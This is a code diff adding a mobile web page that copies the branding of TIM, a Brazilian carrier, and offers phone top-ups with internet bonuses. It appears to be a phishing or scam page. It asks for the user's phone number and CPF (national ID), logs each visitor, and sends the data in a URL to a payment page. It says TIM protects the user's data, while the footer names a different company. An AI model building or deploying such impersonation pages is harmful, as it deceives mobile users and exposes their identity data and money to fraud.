@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>TIM - Recarga</title>
+<link rel="preconnect" href="https://fonts.googleapis.com/" />
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+<style>
+  * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+  body { background-color: #0114C4; color: white; margin: 0; padding: 0; }
+  .mobile-container { max-width: 480px; margin: 0 auto; position: relative; background-color: #0114C4; min-height: 100vh; }
+  header { padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
+  .menu-icon { display: flex; flex-direction: column; gap: 4px; }
+  .menu-icon span { display: block; width: 24px; height: 2px; background-color: white; }
+  .tim-logo-header { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; text-decoration: none; color: white; }
+  .tim-logo-icon { color: #FF192D; }
+  .tim-logo-text { color: white; letter-spacing: -1px; }
+
+  main { padding: 30px 20px; }
+  .title-main { text-align: center; font-weight: 900; font-size: 24px; margin-bottom: 30px; line-height: 1.2; letter-spacing: -0.5px; }
+  .boxes-container { display: flex; flex-direction: column; gap: 16px; margin-bottom: 20px; }
+  .box { background: white; border-radius: 16px; padding: 24px 20px; position: relative; display: flex; justify-content: space-between; align-items: center; }
+  .box-badge { position: absolute; top: -10px; right: 15px; background: #FFCC00; color: #000; font-size: 10px; font-weight: 800; padding: 4px 10px; border-radius: 12px; }
+  .box-left-label { font-size: 12px; font-weight: 700; color: #4052e6; margin-bottom: 2px; }
+  .box-left-price { font-size: 32px; font-weight: 900; color: #FFCC00; line-height: 1; }
+  .box-right-gb { font-size: 40px; font-weight: 900; color: #FFCC00; line-height: 1; margin-bottom: 4px; }
+  .box-right-desc { font-size: 10px; font-weight: 800; color: #4052e6; text-transform: uppercase; line-height: 1.2; }
+  .bonus-disclaimer { text-align: center; font-size: 12px; font-weight: 500; color: rgba(255,255,255,0.7); margin-bottom: 40px; padding: 0 10px; line-height: 1.4; }
+
+  .form-header { text-align: center; margin-bottom: 24px; }
+  .form-title { font-size: 30px; font-weight: 900; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+  .form-subtitle { font-size: 14px; font-weight: 600; margin: 4px 0; }
+
+  .input-group { margin-bottom: 16px; }
+  .input-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; color: rgba(255,255,255,0.9); }
+  .input-group input { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #FF192D; font-size: 16px; color: #333; outline: none; }
+  .input-group input::placeholder { color: #666; }
+  .input-group input:focus { border-color: #FFCC00; }
+
+  .btn-submit { width: 100%; background: #2D3A8C; color: #5866C2; padding: 18px; border-radius: 30px; border: none; font-size: 18px; font-weight: 700; margin-top: 10px; cursor: not-allowed; transition: all .2s; }
+  .btn-submit.btn-active { background-color: #FFCC00; color: #0114C4; cursor: pointer; }
+
+  .promo-section { text-align: center; margin-top: 40px; }
+  .promo-img { max-width: 100%; height: auto; display: block; margin: 0 auto; }
+
+  footer { border-top: 1px solid rgba(255,255,255,0.1); margin-top: 40px; padding: 32px 24px; background-color: #0112A6; }
+  .footer-logo { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; margin-bottom: 16px; }
+  .footer-desc { font-size: 14px; color: rgba(255,255,255,0.8); line-height: 1.5; margin-bottom: 32px; }
+  .footer-copy { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 24px; font-size: 11px; line-height: 1.6; color: rgba(255,255,255,0.6); }
+
+  .input-valid { border-color: #00C853 !important; }
+</style>
+</head>
+<body>
+<div class="mobile-container">
+  <header>
+    <a class="tim-logo-header" href="/">
+      <span class="tim-logo-icon">≡</span>
+      <span class="tim-logo-text">TIM</span>
+    </a>
+    <div class="menu-icon"><span></span><span></span><span></span></div>
+  </header>
+
+  <main>
+    <h1 class="title-main">RECARREGANDO<br>AQUI, VOCÊ TEM<br>BÔNUS DE INTERNET</h1>
+
+    <div class="boxes-container">
+      <div class="box">
+        <div>
+          <div class="box-left-label">A PARTIR DE</div>
+          <div class="box-left-price">R$ 20</div>
+        </div>
+        <div style="text-align: right;">
+          <div class="box-right-gb">+3GB</div>
+          <div class="box-right-desc">+ WHATSAPP<br>ILIMITADO</div>
+        </div>
+      </div>
+
+      <div class="box">
+        <div class="box-badge">MAIS VENDIDO</div>
+        <div>
+          <div class="box-left-label">A PARTIR DE</div>
+          <div class="box-left-price">R$ 39,90</div>
+        </div>
+        <div style="text-align: right;">
+          <div class="box-right-gb">+5GB</div>
+          <div class="box-right-desc">+ WHATSAPP +<br>INSTAGRAM<br>ILIMITADO</div>
+        </div>
+      </div>
+    </div>
+
+    <p class="bonus-disclaimer">
+      Bônus de +3GB em recargas de R$ 20, de +5GB em recargas a<br>partir de R$ 39,90.
+    </p>
+
+    <div class="form-header">
+      <div class="form-title">
+        <span style="color: #FF192D;">≡</span> TIM Recarga
+      </div>
+      <p class="form-subtitle">Preencha seus dados com <strong>segurança</strong></p>
+      <p class="form-subtitle">Com a TIM seus dados estão totalmente <strong>protegidos</strong></p>
+    </div>
+
+    <form id="recarga-form">
+      <div class="input-group">
+        <label>Número TIM</label>
+        <input type="tel" id="phone" inputmode="numeric" placeholder="(11) 99999-9999" maxlength="16">
+      </div>
+      <div class="input-group">
+        <label>CPF</label>
+        <input type="tel" id="cpf" inputmode="numeric" placeholder="000.000.000-00" maxlength="14">
+      </div>
+      <button type="submit" class="btn-submit" id="btn-submit" disabled>Recarregar</button>
+    </form>
+
+    <div class="promo-section">
+      <img src="tim-pre-xip-promo-Ck4FnecT.png" alt="Promo TIM" class="promo-img" onerror="this.style.display='none'">
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-logo">
+      <span style="color: #FF192D;">≡</span>
+      <span style="color: white; letter-spacing: -1px;">TIM</span>
+    </div>
+    <p class="footer-desc">
+      A forma mais rápida e segura de recarregar seu celular TIM. Praticidade e confiança em cada recarga.
+    </p>
+    <div class="footer-copy">
+      Pk Sistema On-Line Recargas Digitais LTDA<br>
+      Nome Fantasia: Pk Sistema On-Line Recargas Digitais<br>
+      CNPJ: 60.071.093/0001-77<br>
+      Inscrição Estadual PE: 1237478-48
+    </div>
+  </footer>
+</div>
+
+<script>
+  // Registra visita
+  fetch('/api/visitante', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      screen: `${window.screen.width}x${window.screen.height}`,
+      pagina: 'index'
+    })
+  }).catch(() => {});
+
+  const phoneInput = document.getElementById('phone');
+  const cpfInput = document.getElementById('cpf');
+  const form = document.getElementById('recarga-form');
+  const btnSubmit = document.getElementById('btn-submit');
+
+  function isValidCPF(cpf) {
+    cpf = cpf.replace(/[^\d]+/g, '');
+    if (!cpf || cpf.length !== 11) return false;
+    if (/^(\d)\1{10}$/.test(cpf)) return false;
+    let add = 0;
+    for (let i = 0; i < 9; i++) add += parseInt(cpf.charAt(i)) * (10 - i);
+    let rev = 11 - (add % 11);
+    if (rev === 10 || rev === 11) rev = 0;
+    if (rev !== parseInt(cpf.charAt(9))) return false;
+    add = 0;
+    for (let i = 0; i < 10; i++) add += parseInt(cpf.charAt(i)) * (11 - i);
+    rev = 11 - (add % 11);
+    if (rev === 10 || rev === 11) rev = 0;
+    if (rev !== parseInt(cpf.charAt(10))) return false;
+    return true;
+  }
+
+  function checkForm() {
+    const phoneValid = phoneInput.value.replace(/\D/g, '').length === 11;
+    const cpfValid = isValidCPF(cpfInput.value);
+    phoneInput.classList.toggle('input-valid', phoneValid);
+    cpfInput.classList.toggle('input-valid', cpfValid);
+    const ok = phoneValid && cpfValid;
+    btnSubmit.classList.toggle('btn-active', ok);
+    btnSubmit.disabled = !ok;
+  }
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    if (btnSubmit.disabled) return;
+    const params = new URLSearchParams({
+      phone: phoneInput.value,
+      cpf: cpfInput.value
+    });
+    window.location.href = 'recarga/pagamento.html?' + params.toString();
+  });
+
+  phoneInput.addEventListener('input', function (e) {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length > 11) v = v.substring(0, 11);
+    if (v.length > 2) v = v.replace(/^(\d{2})(\d)/g, '($1) $2');
+    if (v.length > 9) v = v.replace(/(\d)(\d{4})$/, '$1-$2');
+    e.target.value = v;
+    checkForm();
+  });
+
+  cpfInput.addEventListener('input', function (e) {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length > 11) v = v.substring(0, 11);
+    if (v.length > 3) v = v.replace(/^(\d{3})(\d)/, '$1.$2');
+    if (v.length > 6) v = v.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+    if (v.length > 9) v = v.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+    e.target.value = v;
+    checkForm();
+  });
+
+  checkForm();
+</script>
+</body>
+</html>
